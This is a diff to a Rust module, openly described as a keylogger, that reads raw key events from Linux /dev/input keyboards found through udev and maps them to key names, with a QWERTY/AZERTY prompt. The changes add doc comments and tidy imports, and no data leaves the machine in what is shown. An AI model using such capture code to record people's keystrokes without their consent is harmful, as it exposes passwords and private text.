@@ -1,19 +1,22 @@
-use std::path::Path;
+use byteorder::{NativeEndian, ReadBytesExt};
 use std::{
     collections::HashMap,
     fs::File,
-    io::{BufRead, BufReader},
+    fs::OpenOptions,
+    io::{self, BufRead, BufReader, Cursor, Read, Write},
+    path::Path,
 };
-// extern crate uinput;
-use byteorder::{NativeEndian, ReadBytesExt};
-use std::fs::OpenOptions;
-use std::io::Write;
-use std::io::{self};
-use std::io::{Cursor, Read};
-use udev::Enumerator; // Importation du trait Write
+use udev::Enumerator;
 
-use crate::RUNNING;
-
+/// Initializes the keylogger and checks if the keyboard is QWERTY or AZERTY.
+///
+/// # Arguments
+///
+/// * `is_qwerty` - A mutable reference to a boolean indicating if the keyboard is QWERTY.
+///
+/// # Returns
+///
+/// * `HashMap<u16, String>` - A map of keycodes to key names.
 pub fn init_keylogger(is_qwerty: &mut bool) -> HashMap<u16, String> {
     // Charger la carte de correspondance de touches
     let file_path = "/usr/include/linux/input-event-codes.h";
@@ -24,6 +27,15 @@ pub fn init_keylogger(is_qwerty: &mut bool) -> HashMap<u16, String> {
     keycode_map
 }
 
+/// Creates a keycode map from the given file.
+///
+/// # Arguments
+///
+/// * `file_path` - The path to the file containing keycodes.
+///
+/// # Returns
+///
+/// * `HashMap<u16, String>` - A map of keycodes to key names.
 fn create_keycode_map_from_file(file_path: &str) -> HashMap<u16, String> {
     let mut keycode_map = HashMap::new();
 
@@ -55,6 +67,15 @@ fn create_keycode_map_from_file(file_path: &str) -> HashMap<u16, String> {
     keycode_map
 }
 
+/// Checks if the keyboard is QWERTY or AZERTY.
+///
+/// # Arguments
+///
+/// * `keycode_map` - A mutable reference to the keycode map.
+///
+/// # Returns
+///
+/// * `bool` - Returns true if the keyboard is QWERTY, false if AZERTY.
 fn input_qwerty_azerty(keycode_map: &mut HashMap<u16, String>) -> bool {
     print!("Votre clavier est-il en (Q)WERTY ou (A)ZERTY ? ");
     io::stdout().flush().ok(); // Force l'affichage immédiat du message
@@ -79,6 +100,11 @@ fn input_qwerty_azerty(keycode_map: &mut HashMap<u16, String>) -> bool {
     }
 }
 
+/// Converts a QWERTY keycode map to AZERTY.
+///
+/// # Arguments
+///
+/// * `keycode_map` - A mutable reference to the keycode map.
 fn convert_qwerty_to_azerty(keycode_map: &mut HashMap<u16, String>) {
     // Mappage QWERTY -> AZERTY
     let qwerty_to_azerty: HashMap<&str, &str> = [
@@ -124,6 +150,11 @@ fn convert_qwerty_to_azerty(keycode_map: &mut HashMap<u16, String>) {
     }
 }
 
+/// Lists all keyboards connected to the system.
+///
+/// # Returns
+///
+/// * `Vec<String>` - A list of device paths for keyboards.
 pub fn list_keyboards() -> Vec<String> {
     let mut devices = Vec::new();
 
@@ -144,12 +175,22 @@ pub fn list_keyboards() -> Vec<String> {
         }
     }
 
-    // Suppression du dernier élément s'il existe (potentiellement un clavier virtuel)
+    // Suppression du dernier clavier (le clavier virtuel que j'ai créé)
     devices.pop();
 
     devices
 }
 
+/// Reads key press events from the given file path.
+///
+/// # Arguments
+///
+/// * `path` - The path to the input device file.
+/// * `keycode_map` - A map of keycodes to key names.
+///
+/// # Returns
+///
+/// * `Option<String>` - The name of the pressed key, or None if no key is pressed.
 pub fn get_pressed_key(path: &Path, keycode_map: &HashMap<u16, String>) -> Option<String> {
     let mut file_options = OpenOptions::new();
     file_options.read(true).write(false).create(false);
@@ -164,9 +205,6 @@ pub fn get_pressed_key(path: &Path, keycode_map: &HashMap<u16, String>) -> Optio
 
     let mut packet = [0u8; 24];
     loop {
-        if !RUNNING.load(std::sync::atomic::Ordering::Relaxed) {
-            return None;
-        }
         if let Err(err) = event_file.read_exact(&mut packet) {
             eprintln!(
                 "Erreur lors de la lecture des données dans {:?} : {}",
